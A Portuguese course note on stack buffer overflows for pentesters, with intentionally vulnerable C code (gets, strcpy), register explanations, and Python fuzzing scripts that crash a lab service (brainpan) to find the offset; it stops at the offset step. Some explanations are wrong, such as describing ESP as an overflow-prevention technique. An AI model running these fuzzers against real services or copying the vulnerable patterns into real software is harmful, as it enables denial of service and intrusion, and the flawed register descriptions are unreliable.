---
tags:
  - ENG_REVERSA
links: https://xpsec.academy/home/course/buffer-overflow-para-pentesters/3
---
O **Buffer Overflow** é uma vunerabilidade que ocorre quando escrevemos informações em endereços de memória do buffer na qual não deveriamos.
# Exemplo básico de execução

```c
#include <stdio.h>
#include <strings.h>

int main() {
        char password[10]="NOTHING";
        char checkpass[10];

        printf("Digite a senha correta:");
        gets(checkpass);

        if(strcmp(checkpass,password)==0) {
                printf("\nSenha valida!\n");
        }
        else{
                printf("\nSenha errada!!\n");
        }
        return 0;
}
```

# Registradores Assembly

- **EIP - Extended Instruction Pointer**  - É usado no processador Intel para ==armazenar o endereço da *próxima instrução* a ser executada no programa==.

O registrador EIP é ==*atualizado* automaticamente a cada execução de uma instrução==, para que apontando para a próxima instrução no fluxo do programa.

Por exemplo, suponha que temos o seguinte código em Assembly:

```assembly
MOV AX, 5
MOV BX, 3
ADD AX, BX
```


Ao executar a primeira instrução (MOV AX, 5), o endereço da próxima instrução a ser executada (MOV BX, 3) é armazenado no registrador EIP. Quando a segunda instrução (MOV BX, 3) é executada, o endereço da próxima instrução (ADD AX, BX) é armazenado no registrador EIP, e assim por diante.

- **ESP** - Extended Stack Pointer - É uma técnica utilizada para evitar problemas de pilha (buffer overflow). Em vez de utilizar apenas um registro para o ponteiro da pilha, o ESP utiliza um par de registros: EBP (Extended Base Pointer) e ESP.

EBP é usado como o ponteiro base para a pilha e, ao mesmo tempo, armazena o endereço do registro EBP antes de seu valor ser modificado. Assim, o registro EBP sempre aponta para o endereço onde o ponteiro base foi armazenado anteriormente.

- **JMP** - JUMP - Permite realizar saltos condicionais e incondicionais. Essa instrução é importante porque permite que você controle o fluxo de execução do programa, fazendo com que ele siga um caminho específico, dependendo das condições especificadas.

```assembly
section .data
 value1 db 10
 value2 db 20

section .text
 global _start

_start:
 ; Comparar value1 e value2
 mov al, [value1]
 cmp al, [value2]

 ; Saltar para label1 se value1 for menor que value2
 jl label1

 ; Se value1 não for menor que value2, fazer o que está aqui
 ; ...

 ; Fim do programa
 mov eax, 1
 int 0x80

label1:
 ; Se value1 for menor que value2, fazer o que está aqui
 ; ...

 ; Fim do programa
 mov eax, 1
 int 0x80
```

# Entendendo o Fluxo

```c
#include <stdio.h>
#include <strings.h>

void func(char *str) {
    char buffer[5]; //Função se inicia com o 
    strcpy(buffer, str)

}

void main(int argc, char *argv[]) {
    func(argv[1]);
    printf("%s\n","Executou normalmente");
}
```

A função `func` copia a string fornecida pelo usuário para um buffer de tamanho **5**. Se a string fornecida pelo usuário tiver mais de 5 caracteres, a função `strcpy` irá copiar todos os caracteres, resultando no estouro de buffer.

# Fuzzing

Na máquina alvo, vamos analizar o fluxo por meio de algumas ferramentas: 
- **Immunity Debugger**
- **brainpan**
- **Windows 7 Utimate**

![[Pasted image 20231125015151.png]]

Agora, vamos escrever o código que fará o bufferoverflow na aplicação vulnerável. Para esse teste, será o seguinte código em python:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.0.108"
port = 9999
timeout = 10
prefix = ""

string = prefix + "A" * 200

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Neste exemplo, o script tenta conectar a um servidor (definido pelo IP e porta) e enviar uma string para o servidor. A string começa com o *prefixo* (que neste caso está vazio) e depois é **seguida por 200 "A"s**.

A string é então enviada ao servidor e o script aguarda uma resposta do servidor. Se a **resposta for recebida com sucesso, a string é atualizada adicionando mais 100 "A"s e o processo é repetido** até crashar a aplicação, causando o bufferoverflow! 

# Offset
Desta vez, vamos entender exatamente onde a aplicação crasha com uma pequena modificação no código anterior:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.200.53"
port = 9999
timeout = 10
prefix = ""
string = "A" * 700

try:
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
except:
   print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
   sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
```

